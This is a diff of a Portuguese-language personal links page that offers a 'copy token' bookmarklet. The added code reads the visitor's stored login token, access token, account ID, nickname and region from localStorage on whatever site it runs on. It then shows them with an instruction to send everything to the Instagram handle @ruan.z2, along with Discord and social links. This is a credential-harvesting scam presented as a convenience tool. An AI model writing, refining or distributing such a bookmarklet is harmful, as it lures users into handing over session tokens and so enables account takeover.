@@ -41,8 +41,6 @@ button {
 }
 #btnCopyPC { background: #00eaff; color: #000; box-shadow: 0 0 12px #00eaff, 0 0 25px #00eaff inset; }
 #btnCopyPC:hover { transform: scale(1.07); box-shadow: 0 0 18px #00eaff, 0 0 35px #00eaff inset; }
-#btnCopyAndroid { background: #00eaff; color: #000; border:2px solid #00eaff; box-shadow:0 0 14px #00eaff; }
-#btnCopyAndroid:hover { transform: scale(1.07); box-shadow:0 0 22px #00eaff; }
 #btnDiscord { background: #5865F2; color:white; box-shadow:0 0 12px #5865F2; }
 #btnDiscord:hover { transform: scale(1.07); box-shadow:0 0 20px #5865F2; }
 #btnInsta { background: #ff2dab; color:white; box-shadow:0 0 12px #ff2dab; }
@@ -58,9 +56,8 @@ button img { display: block; }
 
 <h1>Meus links</h1>
 
-<!-- Botões bookmarklet -->
+<!-- Botão bookmarklet -->
 <button id="btnCopyPC">📋 Copiar Token (PC & iOS)</button>
-<button id="btnCopyAndroid">📱 Copiar Token Android</button>
 
 <!-- Botões links com ícones -->
 <button id="btnDiscord">
@@ -77,28 +74,78 @@ button img { display: block; }
 </button>
 
 <script>
-document.addEventListener('DOMContentLoaded', () => {
-  const scriptPCIOS = `javascript:(function(){let panel=document.createElement('div');panel.id='neonPanel';panel.style.cssText="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%) scale(0);opacity:0;background:#0f0f0f;color:#00ffea;padding:20px;border-radius:10px;width:350px;max-width:90vw;font-family:'Courier New',monospace;z-index:99999;box-shadow:0 0 20px #00ffe0,0 0 40px #00ffe0;transition:all 0.3s ease;animation:pulse 2s infinite alternate;";panel.innerHTML=\`<h3 style="margin:0 0 10px 0;font-size:14px;text-align:center;border-bottom:1px solid #00ffe0;padding-bottom:5px;">🔍 Dados Extraídos</h3><pre id="npData" style="background:#111;padding:10px;border-radius:8px;overflow:auto;max-height:220px;white-space:pre-wrap;font-size:13px;"></pre><p style="margin-top:10px;font-size:13px;text-align:center;">📨 <b>Envie todos esses dados para:</b> 👉 <b>@ruan.z2</b></p><div style="display:flex;justify-content:center;margin-top:10px;gap:10px;"><button id="copyBtn" style="background:#00ffea;color:#000;border:none;padding:6px 12px;font-weight:bold;border-radius:6px;cursor:pointer;font-size:13px;transition:all 0.2s ease;">📋 Copiar</button><button id="closeBtn" style="background:#00ffea;color:#000;border:none;padding:6px 12px;font-weight:bold;border-radius:6px;cursor:pointer;font-size:13px;transition:all 0.2s ease;">❌ Fechar</button></div>\`;document.body.appendChild(panel);let style=document.createElement('style');style.innerHTML='@keyframes pulse{0%{transform:translate(-50%,-50%) scale(1);}100%{transform:translate(-50%,-50%) scale(1.02);}} button:hover{transform:scale(1.1);box-shadow:0 0 5px #00ffe0;}';document.head.appendChild(style);setTimeout(()=>{panel.style.transform='translate(-50%,-50%) scale(1)';panel.style.opacity='1';},50);let token=localStorage.getItem("token")||"❌ Não encontrado";let pa=localStorage.getItem("persist:auth");let eat="❌ Não encontrado",nick="❌ Não encontrado",acc="❌ Não encontrado",reg="❌ Não encontrado";try{if(pa){let p1=JSON.parse(pa);if(p1.param){let p2=JSON.parse(p1.param);eat=p2.eat||eat;nick=p2.nickname||nick;acc=p2.account_id||acc;reg=p2.region||reg;}}}catch(e){}document.getElementById('npData').innerText=\`🔑 TOKEN:\n${token}\n\n🔐 ACESS_TOKEN (EAT):\n${eat}\n\n👤 NICK:\n${nick}\n\n🆔 ID:\n${acc}\n\n🌎 REGIÃO:\n${reg}\`;document.getElementById('copyBtn').onclick=function(){navigator.clipboard.writeText(document.getElementById('npData').innerText);let btn=this;let original=btn.innerText;btn.innerText='✔ Copiado!';setTimeout(()=>{btn.innerText=original;},1500);};document.getElementById('closeBtn').onclick=function(){panel.style.transform='translate(-50%,-50%) scale(0.8)';panel.style.opacity='0';setTimeout(()=>{panel.remove();},300);};})();`;
+const scriptPCIOS = `javascript:(function(){
+  let panel=document.createElement('div');
+  panel.id='neonPanel';
+  panel.style.cssText="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%) scale(0);opacity:0;background:#0f0f0f;color:#00ffea;padding:20px;border-radius:10px;width:350px;max-width:90vw;font-family:'Courier New',monospace;z-index:99999;box-shadow:0 0 20px #00ffe0,0 0 40px #00ffe0;transition:all 0.3s ease;";
+  panel.innerHTML=\`
+    <h3 style="margin:0 0 10px 0;font-size:14px;text-align:center;border-bottom:1px solid #00ffe0;padding-bottom:5px;">🔍 Dados Extraídos</h3>
+    <pre id="npData" style="background:#111;padding:10px;border-radius:8px;overflow:auto;max-height:220px;white-space:pre-wrap;font-size:13px;"></pre>
+    <p style="margin-top:10px;font-size:13px;text-align:center;">📨 <b>Envie todos esses dados para:</b> 👉 <b>@ruan.z2</b></p>
+    <div style="display:flex;justify-content:center;margin-top:10px;gap:10px;">
+      <button id="copyBtn" style="background:#00ffea;color:#000;border:none;padding:6px 12px;font-weight:bold;border-radius:6px;cursor:pointer;font-size:13px;">📋 Copiar</button>
+      <button id="closeBtn" style="background:#00ffea;color:#000;border:none;padding:6px 12px;font-weight:bold;border-radius:6px;cursor:pointer;font-size:13px;">❌ Fechar</button>
+    </div>\`;
+  document.body.appendChild(panel);
 
-  const scriptAndroid = `javascript:(function(){alert('Bookmarklet Android aqui!');})();`;
+  setTimeout(()=>{panel.style.transform='translate(-50%,-50%) scale(1)';panel.style.opacity='1';},50);
 
-  // Copiar bookmarklet literal
-  document.getElementById('btnCopyPC').onclick = () => {
-    navigator.clipboard.writeText(scriptPCIOS)
-      .then(()=>alert("📋 Bookmarklet PC & iOS copiado!"))
-      .catch(()=>alert("⚠️ Copie manualmente"));
+  let token = localStorage.getItem("token") || "❌ Não encontrado";
+  let pa = localStorage.getItem("persist:auth");
+  let eat="❌ Não encontrado", nick="❌ Não encontrado", acc="❌ Não encontrado", reg="❌ Não encontrado";
+  try{
+    if(pa){
+      let p1 = JSON.parse(pa);
+      if(p1.param){
+        let p2 = JSON.parse(p1.param);
+        eat=p2.eat||eat;
+        nick=p2.nickname||nick;
+        acc=p2.account_id||acc;
+        reg=p2.region||reg;
+      }
+    }
+  }catch(e){}
+
+  document.getElementById('npData').innerText=\`
+🔑 TOKEN:
+${token}
+
+🔐 ACESS_TOKEN (EAT):
+${eat}
+
+👤 NICK:
+${nick}
+
+🆔 ID:
+${acc}
+
+🌎 REGIÃO:
+${reg}\`;
+
+  document.getElementById('copyBtn').onclick=function(){
+    navigator.clipboard.writeText(document.getElementById('npData').innerText);
+    let btn=this; let original=btn.innerText; btn.innerText='✔ Copiado!';
+    setTimeout(()=>{btn.innerText=original;},1500);
   };
-  document.getElementById('btnCopyAndroid').onclick = () => {
-    navigator.clipboard.writeText(scriptAndroid)
-      .then(()=>alert("📱 Bookmarklet Android copiado!"))
-      .catch(()=>alert("⚠️ Copie manualmente"));
-  };
 
-  // Links
-  document.getElementById('btnDiscord').onclick = () => window.open("https://discord.gg/KEQn5pPsWg","_blank");
-  document.getElementById('btnInsta').onclick = () => window.open("https://www.instagram.com/ruan.z2/?hl=pt-br","_blank");
-  document.getElementById('btnTikTok').onclick = () => window.open("https://www.tiktok.com/@ruan.z2","_blank");
-});
+  document.getElementById('closeBtn').onclick=function(){
+    panel.style.transform='translate(-50%,-50%) scale(0.8)'; panel.style.opacity='0';
+    setTimeout(()=>{panel.remove();},300);
+  };
+})();`;
+
+// Função para copiar bookmarklet
+function copiarBookmarklet(script, mensagem){
+  navigator.clipboard.writeText(script)
+    .then(()=>alert(mensagem))
+    .catch(()=>alert("⚠️ Copie manualmente"));
+}
+
+// Botões
+document.getElementById('btnCopyPC').addEventListener('click', ()=>copiarBookmarklet(scriptPCIOS,"📋 Bookmarklet PC & iOS copiado!"));
+document.getElementById('btnDiscord').addEventListener('click', ()=>window.open("https://discord.gg/KEQn5pPsWg","_blank"));
+document.getElementById('btnInsta').addEventListener('click', ()=>window.open("https://www.instagram.com/ruan.z2/?hl=pt-br","_blank"));
+document.getElementById('btnTikTok').addEventListener('click', ()=>window.open("https://www.tiktok.com/@ruan.z2","_blank"));
 </script>
 
 </body>
